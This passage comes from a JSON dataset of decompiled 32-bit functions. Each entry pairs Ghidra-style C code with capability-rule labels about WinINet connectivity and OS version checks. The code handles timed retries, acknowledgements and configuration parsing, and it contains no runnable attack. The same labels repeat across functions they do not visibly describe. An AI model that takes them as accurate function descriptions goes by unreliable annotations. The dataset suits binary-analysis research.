        bVar4 = uVar1 < *var_a4h;\n            if (uVar1 != *var_a4h) {\ncode_r0x00071935:\n                var_b0h = (1 - bVar4) - (bVar4 != 0);\n                goto code_r0x00071940;\n            }\n            if (uVar1 == 0) break;\n            uVar1 = *(var_a8h + 1);\n            bVar4 = uVar1 < var_a4h[1];\n            if (uVar1 != var_a4h[1]) goto code_r0x00071935;\n            var_a8h = var_a8h + 2;\n            var_a4h = var_a4h + 2;\n        } while (uVar1 != 0);\n        var_b0h = 0;\ncode_r0x00071940:\n        if (var_b0h == 0) {\n            if (*(arg_8h + 0x38) != 0) {\n                return 0x21590064;\n            }\n            *(arg_8h + 0x34) = 1;\n            uVar3 = fcn.00035820(var_8h);\n            *(arg_8h + 0x38) = uVar3;\n            if (*(arg_8h + 0x38) == 0) {\n                return 0x21590004;\n            }\n        }\n        else {\n            iVar2 = fcn.00078a92(&var_88h, 0x80055958);\n            if (iVar2 == 0) {\n                iVar2 = fcn.000364a0(*var_8h);\n                if (iVar2 == 0x41) {\n                    *(arg_8h + 0x24) = 1;\n                }\n                else {\n                    iVar2 = fcn.000364a0(*var_8h);\n                    if (iVar2 == 0x49) {\n                        iVar2 = fcn.000364a0(var_8h[1]);\n                        if (iVar2 == 0x44) {\n                            *(arg_8h + 0x24) = 2;\n                        }\n                        else {\n                            iVar2 = fcn.000364a0(var_8h[1]);\n                            if (iVar2 != 0x4d) {\n                                return 0x21590066;\n                            }\n                            *(arg_8h + 0x24) = 3;\n                        }\n                    }\n                    else {\n                        iVar2 = fcn.000364a0(*var_8h);\n                        if (iVar2 != 0x44) {\n                            return 0x21590066;\n                        }\n                        *(arg_8h + 0x24) = 4;\n                    }\n                }\n            }\n        }\n    } while( true );\n}\n",
        "token_count": 1246
    },
    "00071a90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00071a90(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    uint var_24h;\n    uint var_1ch;\n    char *var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (*(arg_8h + 0x14) == 0) {\n        iVar2 = 0x21590065;\n    }\n    else {\n        iVar2 = fcn.00071080(arg_8h + 0x34, 0);\n        if (iVar2 != 0) {\n            var_18h = *(arg_8h + 0x38);\n            pcVar3 = var_18h + 1;\n            do {\n                cVar1 = *var_18h;\n                var_18h = var_18h + 1;\n            } while (cVar1 != '\\0');\n            iVar2 = fcn.00071a90(arg_8h, *(arg_8h + 0x38), var_18h + (1 - pcVar3));\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n        if (arg_10h == 0) {\n            iVar2 = 0;\n        }\n        else {\n            var_ch = fcn.00078ab0(&var_10h, 0x10000000, 0, 1, 0);\n            if (var_ch == 0) {\n                var_ch = fcn.000789e4(*(arg_8h + 0x14), var_10h, 0, 0, &var_8h, arg_ch, arg_10h, 0, 0);\n                if (var_ch == 0x103) {\n                    var_ch = fcn.00078a62(var_10h, 0, 0);\n                    if (var_ch != 0) {\n                        fcn.000789b4(var_10h);\n                        iVar2 = fcn.00078a2c(var_ch);\n                        return iVar2;\n                    }\n                    var_ch = var_8h;\n                }\n                fcn.000789b4(var_10h);\n                if ((var_ch == 0) && (var_4h != arg_10h)) {\n                    iVar2 = -1;\n                }\n                else if ((var_ch == -0x3ffffeb5) || (var_ch == -0x3fffff50)) {\n                    iVar2 = 0x21590003;\n                }\n                else {\n                    iVar2 = fcn.00078a2c(var_ch);\n                }\n            }\n            else {\n                iVar2 = fcn.00078a2c(var_ch);\n            }\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 658
    },
    "00071bf0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00071bf0(int32_t arg_8h, int32_t *arg_ch, uint32_t *arg_10h, uint32_t arg_14h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    bool bVar8;\n    ulong uVar9;\n    int64_t iVar10;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_50h;\n    char *var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint32_t var_24h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    *arg_ch = 0;\n    if (*(arg_8h + 0x14) == 0) {\n        return 0x21590065;\n    }\n    iVar4 = fcn.00071080(arg_8h + 0x34, 0);\n    if (iVar4 != 0) {\n        var_4ch = *(arg_8h + 0x38);\n        pcVar6 = var_4ch + 1;\n        do {\n            cVar1 = *var_4ch;\n            var_4ch = var_4ch + 1;\n        } while (cVar1 != '\\0');\n        iVar4 = fcn.00071a90(arg_8h, *(arg_8h + 0x38), var_4ch + (1 - pcVar6));\n        if (iVar4 != 0) {\n            return iVar4;\n        }\n    }\n    iVar4 = fcn.00071080(arg_8h + 0x28, 0);\n    if ((iVar4 != 0) && (iVar4 = fcn.00071bf0(arg_8h, arg_8h + 0x2c, arg_8h + 0x30, arg_14h),  iVar4 != 0)) {\n        return iVar4;\n    }\n    do {\n        uVar2 = (*0x8005115c)[1];\n        uVar3 = **0x8005115c;\n    } while (uVar2 != (*0x8005115c)[2]);\n    while( true ) {\n        var_18h = fcn.00078bc4(*(arg_8h + 0x14), 0, 0, 0, &var_14h, 0x11400c, 0, 0, &var_30h, 0x14);\n        if (var_18h == 0x103) {\n            var_18h = fcn.00078a62(*(arg_8h + 0x14), 0, 0);\n            if (var_18h != 0) {\n                iVar4 = fcn.00078a2c(var_18h);\n                return iVar4;\n            }\n            var_18h = var_14h;\n        }\n        if ((var_18h != 0) && (var_18h != -0x7ffffffb)) {\n            if (*(arg_8h + 0x18) != '\\0') {\n                return 0x21590006;\n            }\n            if ((var_18h != -0x3ffffeb5) && (var_18h != -0x3fffff50)) {\n                iVar4 = fcn.00078a2c(var_18h);\n                return iVar4;\n            }\n            return 0x21590003;\n        }\n        var_1ch = var_24h;\n        if (var_24h != 0) break;\n        do {\n            var_4h = (*0x8005115c)[1];\n            var_8h = **0x8005115c;\n        } while (var_4h != (*0x8005115c)[2]);\n        if (arg_14h != 0xffffffff) {\n            bVar8 = var_8h < uVar3;\n            iVar7 = var_8h - uVar3;\n            iVar4 = var_4h - uVar2;\n            uVar5 = (**0x80051158)();\n            uVar9 = fcn.00078be2(iVar7, iVar4 - bVar8, uVar5, 0);\n            iVar10 = fcn.00078bee(uVar9, 10000, 0);\n            if ((-1 < iVar10) && ((0xffffffff < iVar10 || (arg_14h < iVar10)))) {\n                return 0x21590002;\n            }\n        }\n        fcn.00043cb0(10);\n    }\n    iVar4 = fcn.000356c0(var_24h);\n    *arg_ch = iVar4;\n    if (*arg_ch == 0) {\n        return 0x21590004;\n    }\n    *arg_10h = var_1ch;\n    var_18h = fcn.00078ab0(&var_34h, 0x10000000, 0, 1, 0);\n    if (var_18h == 0) {\n        var_ch = 0;\n        while( true ) {\n            if (var_1ch <= var_ch) {\n                fcn.000789b4(var_34h);\n                return 0;\n            }\n            var_18h = fcn.00078a56(*(arg_8h + 0x14), var_34h, 0, 0, &var_14h, *arg_ch + var_ch, var_1ch - var_ch, 0, 0);\n            if (var_18h == 0x103) {\n                var_18h = fcn.00078a62(var_34h, 0, 0);\n                if (var_18h != 0) {\n                    fcn.000357f0(*arg_ch);\n                    *arg_ch = 0;\n                    *arg_10h = 0;\n                    fcn.000789b4(var_34h);\n                    iVar4 = fcn.00078a2c(var_18h);\n                    return iVar4;\n                }\n                var_18h = var_14h;\n            }\n            if (var_18h != 0) break;\n            var_ch = var_ch + var_10h;\n        }\n        fcn.000357f0(*arg_ch);\n        *arg_ch = 0;\n        *arg_10h = 0;\n        fcn.000789b4(var_34h);\n        if (*(arg_8h + 0x18) != '\\0') {\n            return 0x21590006;\n        }\n        if ((var_18h != -0x3fffff50) && (var_18h != -0x3fffff4f)) {\n            iVar4 = fcn.00078a2c(var_18h);\n            return iVar4;\n        }\n        return 0x21590003;\n    }\n    fcn.000357f0(*arg_ch);\n    *arg_ch = 0;\n    *arg_10h = 0;\n    iVar4 = fcn.00078a2c(var_18h);\n    return iVar4;\n}\n",
        "token_count": 1710
    },
    "00071ff0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00071ff0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t var_4h;\n    \n    var_4h = fcn.00071a90(arg_8h, arg_ch, arg_10h);\n    if (var_4h == 0) {\n        var_4h = fcn.00071bf0(arg_8h, arg_14h, arg_18h, arg_1ch);\n    }\n    return var_4h;\n}\n",
        "token_count": 139
    },
    "000722b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.000722b0(int32_t *arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.000356c0(0x74);\n    if (var_4h == 0) {\n        var_10h = 0x21590004;\n    }\n    else {\n        fcn.00078bfa(var_4h, 0, 0x74);\n        var_ch = arg_ch;\n        var_8h = 0;\n        var_10h = fcn.00075eb0(var_4h + 4, &var_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n        if (var_10h == 0) {\n            if ((arg_10h != 0) && (arg_18h == 0)) {\n                var_1ch = var_4h;\n                var_18h = 0x800b2e20;\n                var_14h = 0x800b2e80;\n                fcn.00076b10(*(var_4h + 4), 6, &var_1ch, 0xc, 0);\n            }\n            *(var_4h + 0x34) = 5;\n            *(var_4h + 0x38) = 30000;\n            *(var_4h + 0x3c) = 1000;\n            *(var_4h + 0x40) = 4;\n            if (arg_18h != 0) {\n                *(var_4h + 0x44) = 1;\n            }\n            fcn.000349b0(var_4h + 0x48);\n            fcn.000349b0(var_4h + 0x1c);\n            fcn.000349b0(var_4h + 0x18);\n            fcn.000344b0(var_4h + 0x54);\n            *arg_8h = var_4h;\n        }\n        else {\n            fcn.000357f0(var_4h);\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 572
    },
    "000723e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000723e0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t var_14h;\n    uchar var_10h;\n    uchar var_fh [3];\n    uint *var_ch;\n    uint *var_8h;\n    int32_t var_4h;\n    \n    if (*(arg_8h + 0x10) == 3) {\n        if (arg_ch == 1) {\n            var_fh[0] = 0x20;\n            var_10h = *(arg_8h + 0x14);\n            var_fh[1] = fcn.00078a6e();\n            fcn.00072a20(arg_8h, 0, 1, &var_10h);\n        }\n        else {\n            fcn.00072800(arg_8h, 0, 0, 2);\n            *(arg_8h + 0x10) = 0;\n        }\n    }\n    if (*(arg_8h + 8) != 0) {\n        *(arg_8h + 8) = 0;\n    }\n    *(arg_8h + 0xc) = 1;\n    fcn.00034a10(arg_8h + 0x48);\n    if (*(arg_8h + 0x60) != 0) {\n        var_ch = *(arg_8h + 0x60);\n        while (var_ch != NULL) {\n            var_8h = *var_ch;\n            fcn.00076a80(*(arg_8h + 4), var_ch[1]);\n            fcn.000357f0(var_ch);\n            var_ch = var_8h;\n        }\n        *(arg_8h + 0x60) = 0;\n        *(arg_8h + 100) = 0;\n    }\n    fcn.00034a80(arg_8h + 0x48);\n    fcn.000761d0(arg_8h + 4, 0);\n    var_4h = 0;\n    do {\n        fcn.00034a10(arg_8h + 0x48);\n        if ((*(arg_8h + 0x4c) == 0) && (*(arg_8h + 0x50) == 0)) {\n            var_14h = 1;\n        }\n        else {\n            var_14h = 0;\n        }\n        var_4h = var_14h;\n        fcn.00034a80(arg_8h + 0x48);\n        if (var_4h == 0) {\n            fcn.00034570(arg_8h + 0x54);\n            fcn.00043cb0(10);\n        }\n    } while (var_4h == 0);\n    return;\n}\n",
        "token_count": 625
    },
    "000725a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000725a0(int32_t arg_8h, uint arg_ch)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_4h;\n    \n    if (*(arg_8h + 8) == 0) {\n        iVar2 = fcn.00076560(*(arg_8h + 4), arg_ch);\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        *(arg_8h + 0x20) = *(arg_8h + 0x3c);\n        *(arg_8h + 8) = 1;\n        uVar3 = fcn.00026ff0();\n        *(arg_8h + 0x70) = uVar3;\n        *(arg_8h + 0x6c) = *(arg_8h + 0x70);\n    }\n    if (*(arg_8h + 0x10) == 0) {\n        uVar1 = fcn.00078a6e();\n        *(arg_8h + 0x14) = uVar1;\n        *(arg_8h + 0x10) = 2;\n        iVar2 = fcn.00072800(arg_8h, 0, 0, 1);\n        if (iVar2 != 0) {\n            *(arg_8h + 0x10) = 0;\n            return iVar2;\n        }\n        *(arg_8h + 0x10) = 3;\n    }\n    return 0;\n}\n",
        "token_count": 350
    },
    "00072660": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00072660(int32_t arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.000762e0(*(arg_8h + 4), &var_8h, arg_10h);\n    if (iVar1 == 0) {\n        var_4h = fcn.000356c0(0x74);\n        if (var_4h == 0) {\n            iVar1 = 0x21590004;\n        }\n        else {\n            fcn.00078bfa(var_4h, 0, 0x74);\n            *(var_4h + 4) = var_8h;\n            fcn.000349b0(var_4h + 0x48);\n            fcn.000349b0(var_4h + 0x1c);\n            fcn.000349b0(var_4h + 0x18);\n            fcn.000344b0(var_4h + 0x54);\n            *(var_4h + 8) = 1;\n            *(var_4h + 0x10) = 1;\n            *(var_4h + 0x34) = *(arg_8h + 0x34);\n            *(var_4h + 0x38) = *(arg_8h + 0x38);\n            *(var_4h + 0x3c) = *(arg_8h + 0x3c);\n            *(var_4h + 0x40) = *(arg_8h + 0x40);\n            *(var_4h + 0x44) = *(arg_8h + 0x44);\n            *(var_4h + 0x20) = *(arg_8h + 0x3c);\n            uVar2 = fcn.00026ff0();\n            *(var_4h + 0x70) = uVar2;\n            *(var_4h + 0x6c) = *(var_4h + 0x70);\n            *arg_ch = var_4h;\n            iVar1 = 0;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 525
    },
    "00072780": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00072780(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 0xc) == 0) {\n        if (*(arg_8h + 8) == 0) {\n            uVar1 = 0x21590003;\n        }\n        else {\n            uVar1 = fcn.00072fd0(arg_8h, 2, 0, arg_ch, arg_10h, arg_14h);\n        }\n    }\n    else {\n        uVar1 = 0x21590006;\n    }\n    return uVar1;\n}\n",
        "token_count": 156
    },
    "00072800": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00072800(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    char in_stack_ffffffef;\n    int32_t var_ch;\n    uint var_4h;\n    \n    var_1ch = 0x21590002;\n    fcn.00034a10(arg_8h + 0x18);\n    if (*(arg_8h + 0xc) == 0) {\n        if (*(arg_8h + 8) == 0) {\n            fcn.00034a80(arg_8h + 0x18);\n            var_1ch = 0x21590003;\n        }\n        else {\n            var_20h._0_1_ = *(arg_8h + 0x14);\n            var_20h._1_1_ = arg_14h;\n            uVar1 = fcn.00078a6e();\n            uVar1 = uVar1 & 0x8000007f;\n            if (uVar1 < 0) {\n                uVar1 = (uVar1 - 1 | 0xffffff80) + 1;\n            }\n            var_20h._2_1_ = uVar1;\n            for (var_ch = 0; var_ch < *(arg_8h + 0x34); var_ch = var_ch + 1) {\n                var_18h = fcn.00026ff0();\n                var_1ch = fcn.00072a20(arg_8h, arg_ch, arg_10h, &var_20h);\n                if (var_1ch != 0) break;\n                var_1ch = fcn.00072fd0(arg_8h, 1, &stack0xffffffef, 0, 0, *(arg_8h + 0x20) << 1);\n                if (var_1ch == 0) {\n                    if (in_stack_ffffffef == uVar1) {\n                        iVar2 = fcn.00026ff0();\n                        var_14h = iVar2 - var_18h;\n                        if (var_14h < 100) {\n                            var_14h = 100;\n                        }\n                        *(arg_8h + 0x20) = *(arg_8h + 0x20) + var_14h >> 1;\n                        if (60000 < *(arg_8h + 0x20)) {\n                            *(arg_8h + 0x20) = 60000;\n                        }\n                        *(arg_8h + 0x14) = *(arg_8h + 0x14) + '\\x01';\n                        var_1ch = 0;\n                        break;\n                    }\n                    var_ch = var_ch + -1;\n                }\n                else {\n                    if (var_1ch != 0x21590002) break;\n                    if (var_ch < *(arg_8h + 0x34) + -1) {\n                        if (*(arg_8h + 0x20) < *(arg_8h + 0x3c)) {\n                            *(arg_8h + 0x20) = *(arg_8h + 0x3c);\n                        }\n                        else {\n                            *(arg_8h + 0x20) = *(arg_8h + 0x20) + *(arg_8h + 0x3c);\n                        }\n                    }\n                    else {\n                        var_1ch = 0x21590002;\n                    }\n                }\n            }\n            if (var_1ch == 0x21590002) {\n                *(arg_8h + 0x10) = 0;\n                *(arg_8h + 8) = 0;\n                var_20h._1_1_ = 0x20;\n                fcn.00072a20(arg_8h, 0, 0, &var_20h);\n            }\n            fcn.00034a80(arg_8h + 0x18);\n        }\n    }\n    else {\n        fcn.00034a80(arg_8h + 0x18);\n        var_1ch = 0x21590006;\n    }\n    return var_1ch;\n}\n",
        "token_count": 1059
    },
    "00072a20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00072a20(int32_t arg_8h, uint *arg_ch, uint32_t arg_10h, uint arg_14h)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    uint var_130h;\n    uint *var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (arg_8h == 0) {\n        var_ch = 0x21590065;\n    }\n    else {\n        var_20h = 0;\n        var_1ch = 0;\n        var_18h = NULL;\n        var_14h = 0;\n        var_10h = 0;\n        var_28h = arg_14h;\n        var_24h = 3;\n        if (((arg_10h & 8) == 0) && (arg_ch == NULL)) {\n            var_2ch = &var_1ch;\n            iVar2 = fcn.00078a6e();\n            var_8h = iVar2 % *(arg_8h + 0x40) + 1;\n            for (var_4h = 0; var_4h < var_8h; var_4h = var_4h + 1) {\n                uVar1 = fcn.00078a6e();\n                *(&var_130h + var_4h) = uVar1;\n            }\n            var_18h = &var_130h;\n            var_14h = var_8h;\n        }\n        else {\n            var_2ch = arg_ch;\n        }\n        fcn.00072270(arg_14h);\n        var_ch = fcn.00076cb0(*(arg_8h + 4), &var_2ch, arg_10h);\n        fcn.00072270(arg_14h);\n    }\n    return var_ch;\n}\n",
        "token_count": 478
    },
    "00072b30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00072b30(int32_t arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    if (arg_ch == 1) {\n        if (arg_14h == 0x10) {\n            fcn.00078be8(arg_8h + 0x24, arg_10h, 0x10);\n            var_8h = 0;\n        }\n        else {\n            var_8h = 0x21590064;\n        }\n    }\n    iVar1 = fcn.00076b10(*(arg_8h + 4), arg_ch, arg_10h, arg_14h, arg_18h);\n    if (var_8h != 0) {\n        iVar1 = var_8h;\n    }\n    return iVar1;\n}\n",
        "token_count": 231
    },
    "00072be0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_94h\n// WARNING: Variable defined which should be unmapped: var_90h\n\nint32_t __cdecl fcn.00072be0(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t var_94h;\n    uint var_90h;\n    char *var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = arg_ch;\ncode_r0x00072bef:\n    do {\n        iVar1 = fcn.00078140(&var_8h, &var_90h, 0x80, &var_ch);\n        if (iVar1 == 0) {\n            var_94h = 0;\ncode_r0x00072d95:\n            if (var_94h == 0) {\n                var_94h = fcn.000766e0(*(arg_8h + 4), arg_ch, arg_10h);\n            }\n            return var_94h;\n        }\n        iVar1 = fcn.00078a92(&var_90h, 0x80055964);\n        if (iVar1 == 0) {\n            var_4h = fcn.00078ae0(var_ch);\n            if (var_4h < 1) {\n                var_94h = 0x21590066;\n                goto code_r0x00072d95;\n            }\n            *(arg_8h + 0x34) = var_4h;\n            goto code_r0x00072bef;\n        }\n        iVar1 = fcn.00078a92(&var_90h, 0x80055978);\n        if (iVar1 == 0) {\n            var_4h = fcn.00078ae0(var_ch);\n            var_4h = var_4h * 1000;\n            if (var_4h < 1) {\n                var_94h = 0x21590066;\n                goto code_r0x00072d95;\n            }\n            *(arg_8h + 0x38) = var_4h;\n        }\n        else {\n            iVar1 = fcn.00078a92(&var_90h, 0x8005598c);\n            if (iVar1 == 0) {\n                var_4h = fcn.00078ae0(var_ch);\n                var_4h = var_4h * 1000;\n                if (var_4h < 1) {\n                    var_94h = 0x21590066;\n                    goto code_r0x00072d95;\n                }\n                *(arg_8h + 0x3c) = var_4h;\n            }\n            else {\n                iVar1 = fcn.00078a92(&var_90h, 0x8005599c);\n                if (iVar1 == 0) {\n                    var_4h = fcn.00078ae0(var_ch);\n                    if (var_4h < 1) {\n                        var_94h = 0x21590066;\n                        goto code_r0x00072d95;\n                    }\n                    if (0x100 < var_4h) {\n                        var_4h = 0x100;\n                    }\n                    *(arg_8h + 0x40) = var_4h;\n                }\n                else {\n                    iVar1 = fcn.00078a92(&var_90h, 0x800559b0);\n                    if ((iVar1 == 0) && ((*var_ch == 'Y' || (*var_ch == '1')))) {\n                        *(arg_8h + 0x44) = 0;\n                    }\n                }\n            }\n        }\n    } while( true );\n}\n",
        "token_count": 835
    },
    "00072f50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00072f50(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t var_4h;\n    \n    fcn.00034a10(arg_8h + 0x18);\n    fcn.00034a10(arg_8h + 0x1c);\n    var_4h = fcn.00072f30(arg_8h, arg_ch, 0);\n    if (var_4h == 0) {\n        var_4h = fcn.00072780(arg_8h, arg_10h, arg_14h, arg_18h);\n    }\n    fcn.00034a80(arg_8h + 0x1c);\n    fcn.00034a80(arg_8h + 0x18);\n    return var_4h;\n}\n",
        "token_count": 212
    },
    "00072fd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00072fd0(int32_t arg_8h, int32_t arg_ch, uchar *arg_10h, int32_t *arg_14h, int32_t *arg_18h, uint32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    fcn.00034a10(arg_8h + 0x48);\n    do {\n        if (*(arg_8h + 0xc) != 0) {\n            var_14h = 0x21590006;\ncode_r0x0007321e:\n            fcn.00034a80(arg_8h + 0x48);\n            return var_14h;\n        }\n        if (*(arg_8h + 8) == 0) {\n            var_14h = 0x21590003;\n            goto code_r0x0007321e;\n        }\n        if ((arg_ch == 1) && (*(arg_8h + 0x5c) != 0)) {\n            *arg_10h = *(arg_8h + 0x58);\n            *(arg_8h + 0x5c) = 0;\n            var_14h = 0;\n            goto code_r0x0007321e;\n        }\n        if ((arg_ch == 2) && (*(arg_8h + 0x60) != 0)) {\n            *arg_14h = *(*(arg_8h + 0x60) + 4) + 3;\n            *arg_18h = *(*(arg_8h + 0x60) + 8) + -3;\n            *(arg_8h + 0x68) = *(arg_8h + 0x68) - *(*(arg_8h + 0x60) + 8);\n            iVar1 = **(arg_8h + 0x60);\n            fcn.000357f0(*(arg_8h + 0x60));\n            *(arg_8h + 0x60) = iVar1;\n            if (iVar1 == 0) {\n                *(arg_8h + 100) = 0;\n            }\n            if (*arg_18h == 0) {\n                fcn.00072b10(arg_8h, *arg_14h);\n                *arg_14h = 0;\n            }\n            var_14h = 0;\n            goto code_r0x0007321e;\n        }\n        bVar2 = *(arg_8h + 0x4c) != 0;\n        if (bVar2) {\n            *(arg_8h + 0x50) = *(arg_8h + 0x50) + 1;\n        }\n        else {\n            *(arg_8h + 0x4c) = 1;\n        }\n        fcn.00034a80(arg_8h + 0x48);\n        if (!bVar2) {\n            var_14h = fcn.00073240(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n            fcn.00034a10(arg_8h + 0x48);\n            *(arg_8h + 0x4c) = 0;\n            fcn.00034570(arg_8h + 0x54);\n            goto code_r0x0007321e;\n        }\n        if (arg_1ch == 0) {\n            var_14h = 0x21590002;\n            goto code_r0x0007321e;\n        }\n        if (arg_1ch != 0xffffffff) {\n            var_8h = fcn.00026ff0();\n        }\n        iVar1 = fcn.000345a0(arg_8h + 0x54, arg_1ch);\n        if (iVar1 == 0) {\n            var_14h = 0x21590002;\n            fcn.00034a10(arg_8h + 0x48);\n            *(arg_8h + 0x50) = *(arg_8h + 0x50) + -1;\n            goto code_r0x0007321e;\n        